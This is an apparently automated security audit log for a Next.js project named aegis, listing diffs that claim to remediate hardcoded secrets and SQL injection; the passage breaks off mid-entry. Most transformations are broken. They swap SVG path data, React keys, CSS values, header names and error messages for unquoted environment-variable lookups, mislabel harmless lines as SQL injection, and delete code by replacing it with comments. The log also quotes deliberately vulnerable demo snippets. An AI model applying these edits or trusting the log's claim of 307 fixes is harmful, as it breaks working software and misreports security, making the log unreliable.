# 🛡️ AEGIS SECURITY AUDIT LOG

## 🕒 Audit Session: 13/05/2026, 10.42.09
- **Context:**  project detected.
- **Entry Point:** unknown
- **Target:** `C:\Project Sems 6\aegis`
- **Summary:** 307 vulnerabilities remediated.

### 🔍 Remediation Detail

#### [1] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\dashboard\page.tsx:58`

**Code Transformation:**
```diff
- <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14 21 3"/>
+                 <path d=process.env.D/>
```

#### [2] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\layout.tsx:136`

**Code Transformation:**
```diff
- <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/>
+                 <path d=process.env.D/>
```

#### [3] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\layout.tsx:158`

**Code Transformation:**
```diff
- <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/>
+                 <path d=process.env.D/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/>
```

#### [4] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\layout.tsx:205`

**Code Transformation:**
```diff
- <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+                         <path d=process.env.D/>
```

#### [5] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase0\page.tsx:126`

**Code Transformation:**
```diff
- <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+                       <path d=process.env.D/>
```

#### [6] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase0\page.tsx:177`

**Code Transformation:**
```diff
- key="selection"
+                     key=process.env.KEY
```

#### [7] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase0\page.tsx:236`

**Code Transformation:**
```diff
- key="analyzing"
+               key=process.env.KEY
```

#### [8] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase0\page.tsx:247`

**Code Transformation:**
```diff
- border: '1px solid rgba(220,38,38,0.2)',
+                 border: process.env.BORDER, 
```

#### [9] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase0\page.tsx:257`

**Code Transformation:**
```diff
- boxShadow: 'inset 0 0 40px rgba(220,38,38,0.05), 0 20px 50px rgba(0,0,0,0.5)'
+                 boxShadow: process.env.BOXSHADOW
```

#### [10] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase0\page.tsx:305`

**Code Transformation:**
```diff
- key="stack_confirm"
+               key=process.env.KEY
```

#### [11] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:132`

**Code Transformation:**
```diff
- issue: 'Hardcoded Database Password',
+               issue: process.env.ISSUE, 
```

#### [12] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:134`

**Code Transformation:**
```diff
- currentCode: `DB_PASSWORD = "admin123!@#secret"`,
+               currentCode: `DB_PASSWORD = process.env.DB_PASSWORD`,
```

#### [13] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:144`

**Code Transformation:**
```diff
- currentCode: `JWT_SECRET = "MySuper$ecretKey2024!xyz"`,
+               currentCode: `JWT_SECRET = process.env.JWT_SECRET`,
```

#### [14] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:154`

**Code Transformation:**
```diff
- currentCode: `const AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\nconst AWS_SECRET = "wJalrXUtnFEMI/K7MDENG"`,
+               currentCode: `const AWS_KEY = process.env.AWS_KEY\nconst AWS_SECRET = "wJalrXUtnFEMI/K7MDENG"`,
```

#### [15] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:162`

**Code Transformation:**
```diff
- issue: 'SQL Injection Vulnerability',
+               issue: process.env.ISSUE, 
```

#### [16] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:164`

**Code Transformation:**
```diff
- currentCode: `query = f"SELECT * FROM users WHERE id = {user_id}"`,
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [17] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:165`

**Code Transformation:**
```diff
- fixedCode: `query = "SELECT * FROM users WHERE id = %s", (user_id,)`,
+               fixedCode: `query = process.env.QUERY, (user_id,)`,
```

#### [18] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:174`

**Code Transformation:**
```diff
- currentCode: `const STRIPE_KEY = "sk_live_51ABC123xyz..."`,
+               currentCode: `const STRIPE_KEY = process.env.STRIPE_KEY`,
```

#### [19] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:182`

**Code Transformation:**
```diff
- issue: 'Telegram Bot Token Exposed',
+               issue: process.env.ISSUE, 
```

#### [20] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:184`

**Code Transformation:**
```diff
- currentCode: `BOT_TOKEN = "6789012345:AAHdqTcvZ..."`,
+               currentCode: `BOT_TOKEN = process.env.BOT_TOKEN`,
```

#### [21] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:334`

**Code Transformation:**
```diff
- key="dashboard"
+             key=process.env.KEY
```

#### [22] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\app\(main)\phases\phase1\page.tsx:436`

**Code Transformation:**
```diff
- className={`${styles.vulnRow} ${selectedFinding?.id === f.id ? styles.selected : ''} ${f.patched ? styles.patched : ''}`}
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [23] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\page.tsx:92`

**Code Transformation:**
```diff
- code: 'const query = `SELECT * FROM users WHERE id = ${userId}`',
+         code: process.env.CODE,
```

#### [24] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\page.tsx:100`

**Code Transformation:**
```diff
- file: 'src/components/Comment.tsx',
+         file: process.env.FILE,
```

#### [25] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\page.tsx:102`

**Code Transformation:**
```diff
- code: '<div dangerouslySetInnerHTML={{ __html: userComment }} />',
+         code: process.env.CODE,
```

#### [26] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\page.tsx:122`

**Code Transformation:**
```diff
- code: 'module.exports = { /* no security headers */ }',
+         code: process.env.CODE,
```

#### [27] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\page.tsx:132`

**Code Transformation:**
```diff
- code: 'const token = Math.random().toString(36).substring(7)',
+         code: process.env.CODE,
```

#### [28] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\page.tsx:367`

**Code Transformation:**
```diff
- key="fix-detail"
+                 key=process.env.KEY
```

#### [29] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\page.tsx:414`

**Code Transformation:**
```diff
- border: '1px solid rgba(34, 197, 94, 0.3)',
+                       border: process.env.BORDER,
```

#### [30] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:8`

**Code Transformation:**
```diff
- const STORAGE_KEY = "aegis_pentest_state";
+ const STORAGE_KEY = process.env.STORAGE_KEY;
```

#### [31] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:64`

**Code Transformation:**
```diff
- recommendation: "Implement proper access control checks and use indirect references or UUIDs"
+     recommendation: process.env.RECOMMENDATION
```

#### [32] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:68`

**Code Transformation:**
```diff
- recommendation: "Implement role-based access control (RBAC) and verify permissions server-side"
+     recommendation: process.env.RECOMMENDATION
```

#### [33] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:72`

**Code Transformation:**
```diff
- recommendation: "Sanitize file paths and use allowlists for accessible directories"
+     recommendation: process.env.RECOMMENDATION
```

#### [34] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:76`

**Code Transformation:**
```diff
- recommendation: "Use TLS for data in transit and encrypt sensitive data at rest"
+     recommendation: process.env.RECOMMENDATION
```

#### [35] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:80`

**Code Transformation:**
```diff
- recommendation: "Use strong encryption (AES-256) and secure key management"
+     recommendation: process.env.RECOMMENDATION
```

#### [36] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:84`

**Code Transformation:**
```diff
- recommendation: "Use parameterized queries or prepared statements"
+     recommendation: process.env.RECOMMENDATION
```

#### [37] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:92`

**Code Transformation:**
```diff
- recommendation: "Implement Content Security Policy and encode all output"
+     recommendation: process.env.RECOMMENDATION
```

#### [38] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:96`

**Code Transformation:**
```diff
- recommendation: "Implement server-side validation for all business rules"
+     recommendation: process.env.RECOMMENDATION
```

#### [39] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:100`

**Code Transformation:**
```diff
- recommendation: "Implement rate limiting and account lockout policies"
+     recommendation: process.env.RECOMMENDATION
```

#### [40] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:116`

**Code Transformation:**
```diff
- recommendation: "Patch or upgrade affected components immediately"
+     recommendation: process.env.RECOMMENDATION
```

#### [41] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:120`

**Code Transformation:**
```diff
- recommendation: "Implement CAPTCHA, rate limiting, and account lockout"
+     recommendation: process.env.RECOMMENDATION
```

#### [42] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:124`

**Code Transformation:**
```diff
- recommendation: "Regenerate session ID after login and implement secure session management"
+     recommendation: process.env.RECOMMENDATION
```

#### [43] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:132`

**Code Transformation:**
```diff
- recommendation: "Implement comprehensive logging for authentication and authorization events"
+     recommendation: process.env.RECOMMENDATION
```

#### [44] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase2\report\page.tsx:230`

**Code Transformation:**
```diff
- recommendation: "Review and fix the identified security issue"
+                   recommendation: process.env.RECOMMENDATION
```

#### [45] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase3\page.tsx:132`

**Code Transformation:**
```diff
- const installCommand = 'npm install @aegis/protect'
+   const installCommand = process.env.INSTALLCOMMAND
```

#### [46] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase3\page.tsx:382`

**Code Transformation:**
```diff
- <a href="https://github.com/settings/tokens/new?scopes=repo&description=AEGIS%20Security" target="_blank" rel="noopener noreferrer">
+                     <a href=process.env.HREF target="_blank" rel="noopener noreferrer">
```

#### [47] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\phase3\page.tsx:463`

**Code Transformation:**
```diff
- key="monitoring"
+             key=process.env.KEY
```

#### [48] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\review-findings\page.tsx:27`

**Code Transformation:**
```diff
- issue: 'SQL Injection via unsanitized user input in query string.',
+       issue: process.env.ISSUE,
```

#### [49] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\review-findings\page.tsx:36`

**Code Transformation:**
```diff
- issue: 'MD5 used for password hashing. Transition to Argon2 recommended.',
+       issue: process.env.ISSUE,
```

#### [50] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\review-findings\page.tsx:38`

**Code Transformation:**
```diff
- oldCode: 'hash = hashlib.md5(password.encode()).hexdigest()',
+       oldCode: process.env.OLDCODE,
```

#### [51] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\phases\review-findings\page.tsx:39`

**Code Transformation:**
```diff
- newCode: 'hash = argon2.PasswordHasher().hash(password)'
+       newCode: process.env.NEWCODE
```

#### [52] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\projects\page.tsx:98`

**Code Transformation:**
```diff
- <path className={styles.circleBg} d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+                       <path className={styles.circleBg} d=process.env.D />
```

#### [53] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\projects\page.tsx:102`

**Code Transformation:**
```diff
- d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
+                         d=process.env.D 
```

#### [54] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\(main)\reports\page.tsx:55`

**Code Transformation:**
```diff
- <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/>
+                     <path d=process.env.D/>
```

#### [55] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\attacks\route.ts:80`

**Code Transformation:**
```diff
- explanation: "AI unavailable, applying generic protection",
+         explanation: process.env.EXPLANATION,
```

#### [56] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\deploy\route.ts:34`

**Code Transformation:**
```diff
- message: 'Serverless mode - local deployment required'
+           message: process.env.MESSAGE
```

#### [57] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:40`

**Code Transformation:**
```diff
- const query = "SELECT * FROM users WHERE id = ?"
+ const query = process.env.QUERY
```

#### [58] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:46`

**Code Transformation:**
```diff
- explanation: 'Replaced string concatenation with parameterized query to prevent SQL injection attacks.'
+       explanation: process.env.EXPLANATION
```

#### [59] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:77`

**Code Transformation:**
```diff
- explanation: 'Applied output encoding/sanitization to prevent Cross-Site Scripting (XSS) attacks.'
+       explanation: process.env.EXPLANATION
```

#### [60] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:92`

**Code Transformation:**
```diff
- explanation: 'Moved hardcoded secrets to environment variables. Add .env to .gitignore to prevent accidental commits.'
+       explanation: process.env.EXPLANATION
```

#### [61] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:117`

**Code Transformation:**
```diff
- explanation: 'Replaced weak cryptographic algorithm with a stronger alternative (SHA-256 or bcrypt for passwords).'
+       explanation: process.env.EXPLANATION
```

#### [62] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:140`

**Code Transformation:**
```diff
- explanation: 'Added path validation to prevent directory traversal attacks. Always validate that resolved paths stay within allowed directories.'
+       explanation: process.env.EXPLANATION
```

#### [63] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:162`

**Code Transformation:**
```diff
- explanation: 'Replaced Math.random() with crypto.randomBytes() for cryptographically secure random number generation.'
+       explanation: process.env.EXPLANATION
```

#### [64] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:189`

**Code Transformation:**
```diff
- explanation: 'Added authentication check to protect sensitive endpoint. Always verify user identity before processing requests.'
+       explanation: process.env.EXPLANATION
```

#### [65] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:217`

**Code Transformation:**
```diff
- explanation: 'Added CSRF token validation to prevent Cross-Site Request Forgery attacks.'
+       explanation: process.env.EXPLANATION
```

#### [66] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:246`

**Code Transformation:**
```diff
- explanation: 'Added URL validation to prevent open redirect attacks. Only allow redirects to whitelisted domains or relative paths.'
+       explanation: process.env.EXPLANATION
```

#### [67] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:285`

**Code Transformation:**
```diff
- explanation: 'Added rate limiting to prevent brute force and DoS attacks. Adjust limits based on your use case.'
+       explanation: process.env.EXPLANATION
```

#### [68] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:308`

**Code Transformation:**
```diff
- explanation: 'Replaced shell command execution with safer alternatives. Use spawn with shell:false or native Node.js APIs.'
+       explanation: process.env.EXPLANATION
```

#### [69] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:338`

**Code Transformation:**
```diff
- explanation: 'Added prototype pollution protection by filtering dangerous keys (__proto__, constructor, prototype).'
+       explanation: process.env.EXPLANATION
```

#### [70] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:346`

**Code Transformation:**
```diff
- key: 'X-DNS-Prefetch-Control',
+     key: process.env.KEY,
```

#### [71] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:350`

**Code Transformation:**
```diff
- key: 'Strict-Transport-Security',
+     key: process.env.KEY,
```

#### [72] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:354`

**Code Transformation:**
```diff
- key: 'X-Frame-Options',
+     key: process.env.KEY,
```

#### [73] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:358`

**Code Transformation:**
```diff
- key: 'X-Content-Type-Options',
+     key: process.env.KEY,
```

#### [74] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:362`

**Code Transformation:**
```diff
- key: 'Referrer-Policy',
+     key: process.env.KEY,
```

#### [75] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:363`

**Code Transformation:**
```diff
- value: 'strict-origin-when-cross-origin'
+     value: process.env.VALUE
```

#### [76] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:366`

**Code Transformation:**
```diff
- key: 'Content-Security-Policy',
+     key: process.env.KEY,
```

#### [77] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:379`

**Code Transformation:**
```diff
- explanation: 'Added security headers to protect against clickjacking, XSS, and other attacks.'
+       explanation: process.env.EXPLANATION
```

#### [78] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\fix\route.ts:401`

**Code Transformation:**
```diff
- return NextResponse.json({ error: 'vulnerabilities array is required' }, { status: 400 })
+         return NextResponse.json({ error: process.env.ERROR }, { status: 400 })
```

#### [79] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\github\pr\route.ts:79`

**Code Transformation:**
```diff
- return NextResponse.json({ error: 'GitHub access token required' }, { status: 401 })
+       return NextResponse.json({ error: process.env.ERROR }, { status: 401 })
```

#### [80] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\ngrok\route.ts:55`

**Code Transformation:**
```diff
- error: 'repoUrl and sessionId are required'
+           error: process.env.ERROR 
```

#### [81] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\ngrok\route.ts:66`

**Code Transformation:**
```diff
- message: 'Application deployed to ngrok for live testing'
+         message: process.env.MESSAGE
```

#### [82] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\report\route.ts:53`

**Code Transformation:**
```diff
- message: "Report generated successfully",
+       message: process.env.MESSAGE,
```

#### [83] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:101`

**Code Transformation:**
```diff
- const query = \`SELECT * FROM users WHERE username = '\${username}'\`;
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [84] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:104`

**Code Transformation:**
```diff
- const query = 'SELECT * FROM users WHERE username = ?';
+ const query = process.env.QUERY;
```

#### [85] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:119`

**Code Transformation:**
```diff
- const user = await db.query(\`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`);`
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [86] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:295`

**Code Transformation:**
```diff
- { key: 'X-Frame-Options', value: 'DENY' },
+         { key: process.env.KEY, value: 'DENY' },
```

#### [87] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:296`

**Code Transformation:**
```diff
- { key: 'X-Content-Type-Options', value: 'nosniff' },
+         { key: process.env.KEY, value: 'nosniff' },
```

#### [88] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:297`

**Code Transformation:**
```diff
- { key: 'Strict-Transport-Security', value: 'max-age=31536000' },
+         { key: process.env.KEY, value: 'max-age=31536000' },
```

#### [89] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:298`

**Code Transformation:**
```diff
- { key: 'Content-Security-Policy', value: "default-src 'self'" }
+         { key: process.env.KEY, value: "default-src 'self'" }
```

#### [90] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:367`

**Code Transformation:**
```diff
- message: { error: 'Too many login attempts, try again later' }
+   message: { error: process.env.ERROR }
```

#### [91] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\pentest\route.ts:501`

**Code Transformation:**
```diff
- usage: '/api/pentest?url=https://target.com'
+       usage: process.env.USAGE
```

#### [92] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:41`

**Code Transformation:**
```diff
- fix: "Use environment variables or a secure secrets manager."
+     fix: process.env.FIX
```

#### [93] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:45`

**Code Transformation:**
```diff
- fix: "Store in environment variables or use a secrets management service."
+     fix: process.env.FIX
```

#### [94] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:49`

**Code Transformation:**
```diff
- fix: "Use parameterized queries or prepared statements."
+     fix: process.env.FIX
```

#### [95] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:53`

**Code Transformation:**
```diff
- fix: "Use spawn with array arguments instead of exec with string concatenation."
+     fix: process.env.FIX
```

#### [96] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:57`

**Code Transformation:**
```diff
- fix: "Sanitize user input before rendering or use safe templating methods."
+     fix: process.env.FIX
```

#### [97] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:61`

**Code Transformation:**
```diff
- fix: "Validate and sanitize file paths, use path.resolve() and check against allowed directories."
+     fix: process.env.FIX
```

#### [98] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:65`

**Code Transformation:**
```diff
- fix: "Avoid eval() entirely. Use JSON.parse() for JSON data or safer alternatives."
+     fix: process.env.FIX
```

#### [99] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:69`

**Code Transformation:**
```diff
- fix: "Use spawn() with array arguments for better security."
+     fix: process.env.FIX
```

#### [100] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:73`

**Code Transformation:**
```diff
- fix: "Ensure debug mode is disabled in production environments."
+     fix: process.env.FIX
```

#### [101] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:77`

**Code Transformation:**
```diff
- fix: "Use crypto.randomBytes() or crypto.getRandomValues() for security-sensitive operations."
+     fix: process.env.FIX
```

#### [102] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:81`

**Code Transformation:**
```diff
- fix: "Remove console.log statements that contain sensitive information."
+     fix: process.env.FIX
```

#### [103] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\scan\route.ts:256`

**Code Transformation:**
```diff
- return NextResponse.json({ error: 'Repository URL is required' }, { status: 400 })
+       return NextResponse.json({ error: process.env.ERROR }, { status: 400 })
```

#### [104] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\app\api\telegram\callback\route.ts:101`

**Code Transformation:**
```diff
- await answerCallbackQuery(cbId, reason === "not_found" ? "Healing not found" : `Already ${existing?.status?.toLowerCase()}`);
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [105] SQL Injection Vulnerability
- **Location:** `aegis-teaser\src\app\api\telegram\callback\route.ts:167`

**Code Transformation:**
```diff
- await answerCallbackQuery(cbId, reason === "not_found" ? "Healing not found" : `Already ${existing?.status?.toLowerCase()}`);
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [106] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\telegram\notify\route.ts:12`

**Code Transformation:**
```diff
- { error: "TELEGRAM_CHAT_ID not configured. Call /api/telegram/setup first." },
+         { error: process.env.ERROR },
```

#### [107] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\telegram\notify\route.ts:101`

**Code Transformation:**
```diff
- return NextResponse.json({ error: "Unknown type. Use: healing, alert, log, phase3_complete, or attack_blocked" }, { status: 400 });
+     return NextResponse.json({ error: process.env.ERROR }, { status: 400 });
```

#### [108] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\telegram\setup\route.ts:24`

**Code Transformation:**
```diff
- message: "No chat found. Please send /start to the bot first, then call this endpoint again.",
+         message: process.env.MESSAGE,
```

#### [109] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\telegram\setup\route.ts:30`

**Code Transformation:**
```diff
- message: "Chat ID(s) found. Set TELEGRAM_CHAT_ID in .env.local",
+       message: process.env.MESSAGE,
```

#### [110] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\telegram\setup\route.ts:32`

**Code Transformation:**
```diff
- instruction: "Add the chat_id to your .env.local file as TELEGRAM_CHAT_ID",
+       instruction: process.env.INSTRUCTION,
```

#### [111] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\api\vercel\route.ts:216`

**Code Transformation:**
```diff
- return NextResponse.json({ error: 'Invalid action. Use: deploy, status, delete' }, { status: 400 })
+     return NextResponse.json({ error: process.env.ERROR }, { status: 400 })
```

#### [112] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\auth\github\actions.ts:9`

**Code Transformation:**
```diff
- return { error: 'No GitHub token found. Please sign in with GitHub again.' }
+     return { error: process.env.ERROR }
```

#### [113] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\auth\github\actions.ts:16`

**Code Transformation:**
```diff
- Accept: 'application/vnd.github+json',
+         Accept: process.env.ACCEPT,
```

#### [114] Hardcoded Sensitive Data
- **Location:** `aegis-teaser\src\app\auth\github\actions.ts:37`

**Code Transformation:**
```diff
